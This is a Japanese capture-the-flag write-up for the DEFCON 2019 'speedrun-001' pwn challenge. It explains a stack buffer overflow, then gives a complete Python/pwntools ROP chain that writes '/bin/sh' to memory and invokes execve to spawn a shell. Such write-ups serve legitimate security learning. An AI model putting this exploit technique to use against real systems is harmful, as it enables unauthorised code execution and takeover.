# DEFCON 2019 `speedrun [pwn]` writeup

## 問題

バイナリが配布されていて、サーバでそのバイナリのサービスが公開されている。

## 解法

### 簡単な調査

まずはバイナリをチェック。
64bit。canaryが無い。PIEも無効。
まぁバッファオーバフローだなと。

```bash-statement
saru@lucifen:~/wani-writeup/2019/05-defcon/pwn-speedrun-001$ checksec speedrun-001
[*] '/home/saru/wani-writeup/2019/05-defcon/pwn-speedrun-001/speedrun-001'
   Arch:     amd64-64-little
   RELRO:    Partial RELRO
   Stack:    No canary found
   NX:       NX enabled
   PIE:      No PIE
saru@lucifen:~/wani-writeup/2019/05-defcon/pwn-speedrun-001$
```

｀"a" * 1024｀でsegmentation faultが起きた。

ghidraでみてみると難読化されてて心が折れた。

が、チームメンバーが1033番目から書き換えるとEIPを取れることを確認してくれたのでそれを利用して二度`Hello brave new challenger`が表示できることを確認。

### ソースコード

```python
import sys

padding = b"A"*1032
exploit = b'\xc1\x0b\x40\x00\x00\x00\x00\x00' 
exploit = padding + exploit

sys.stdout.buffer.write(exploit)
```

### 実行結果

```
saru@lucifen:~/wani-writeup/2019/05-defcon/pwn-speedrun-001$ cat exploit02.txt | ./speedrun-001

Hello brave new challenger

Any last words?

This will be the last thing that you say: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA▒

                                                                  @

Hello brave new challenger

Any last words?

Segmentation fault (core dumped)

saru@lucifen:~/wani-writeup/2019/05-defcon/pwn-speedrun-001$
```


### ROPを組む

`NX enabled`ということは単純にシェルコードを送り込むだけじゃだめ。
ということでROPだなーと。
64bitのROPは組んだことあったようなないような。

あった。 
[PWNオーバーフロー入門: 64bit環境でのアドレスリークを利用してシェルを起動 (SSP、PIE無効で64bit ELF) Classic Pwn 2回目 ](https://github.com/saru2017/pwn010) 
が少し違うか。

戦略はROPでexecveシステムコールを直接呼んで`/bin/sh`を起動すること。

まず、64bitでシステムコールを呼ぶのは`syscall`命令を呼ぶ。
システムコール番号はrax、引数はrdi,rsi,rdx,r10の順番に呼ぶ。 
[Reversingとかpwnとかを解くときのメモ(かきかけ) - 忖度](http://satos.hatenablog.jp/entry/2016/12/02/192417)

execveのシステムコール番号は59。 
[Syscall Number for x86-64 linux (A)](https://www.mztn.org/lxasm64/x86_x64_table.html)

`execve`を呼ぶときにはexecve("/bin/sh", argv, NULL)で呼び、argvは["/bin/sh", NULL]となる．
つまり
- rdi → "/bin/sh"のアドレス
- rsi → argvのアドレス
- rdx → NULL

を入れ、
- "/bin/sh"のアドレス → NULLで終わる文字列/bin/sh
- argvのアドレス → "/bin/sh"のアドレス, NULLの順に8バイトずつ

を入れれば良い。

ところが今回はlibcを使っていないこともあり、"/bin/sh"が無い。
"/bin/sh"は自分で放り込まなければならない。

書き込むのには`mov [rax] rdx`の命令を使う。
raxに書き込まれているアドレスにrdxの値を書き込む。

後はmovで書き込み可能なアドレスを探さなければならない。
スタックはASLR有効なので書き込めない。
どこかないかなと思いgdbでstartした後info proc map。
0x6b6000が何の空間だか分からないけど行けそうな。

```
gdb-peda$ info proc map
process 20968
Mapped address spaces:

          Start Addr           End Addr       Size     Offset objfile
            0x400000           0x4b6000    0xb6000        0x0 /home/saru/wani-writeup/2019/05-defcon/pwn-speedrun-001/speedrun-001
            0x6b6000           0x6bc000     0x6000    0xb6000 /home/saru/wani-writeup/2019/05-defcon/pwn-speedrun-001/speedrun-001
            0x6bc000           0x6bd000     0x1000        0x0 [heap]
      0x7ffff7ffa000     0x7ffff7ffd000     0x3000        0x0 [vvar]
      0x7ffff7ffd000     0x7ffff7fff000     0x2000        0x0 [vdso]
      0x7ffffffde000     0x7ffffffff000    0x21000        0x0 [stack]
  0xffffffffff600000 0xffffffffff601000     0x1000        0x0 [vsyscall]
gdb-peda$
```

以上を踏まえたコードが以下の通りとなる。

```python
import sys
import pwn

addr_syscall = 0x0000000000474e65
addr_pop_rax = 0x0000000000415664
addr_pop_rdx = 0x00000000004498b5
addr_mov_rax_rdx = 0x000000000048d251

addr_push_rsp = 0x0000000000450ae4
addr_pop_rdi = 0x0000000000400686
addr_pop_rsi = 0x00000000004101f3
binsh = 0x0068732f6e69622f
#binsh = 0x00736c2f6e69622f
#addr_write = 0x400000
#addr_write = 0x7ffc5ae9d000
addr_write = 0x6b6000
addr_ptr_write = addr_write + 0x18

exploit = b"A"*1032

exploit += pwn.p64(addr_pop_rax)
exploit += pwn.p64(addr_write)
exploit += pwn.p64(addr_pop_rdx)
exploit += pwn.p64(binsh)
exploit += pwn.p64(addr_mov_rax_rdx)
exploit += pwn.p64(addr_pop_rax)
exploit += pwn.p64(addr_ptr_write)
exploit += pwn.p64(addr_pop_rdx)
exploit += pwn.p64(addr_write)
exploit += pwn.p64(addr_mov_rax_rdx)
exploit += pwn.p64(addr_pop_rsi)
exploit += pwn.p64(addr_ptr_write)
exploit += pwn.p64(addr_pop_rdi)
exploit += pwn.p64(addr_write)
exploit += pwn.p64(addr_pop_rdx)
exploit += pwn.p64(0)
exploit += pwn.p64(addr_pop_rax)
exploit += pwn.p64(59)
exploit += pwn.p64(addr_syscall)

sys.stdout.buffer.write(exploit)
```


## 参考

- [ブルートフォースによる32bit ASLR回避 - ももいろテクノロジー](http://inaz2.hatenablog.com/entry/2014/03/15/073837)

	
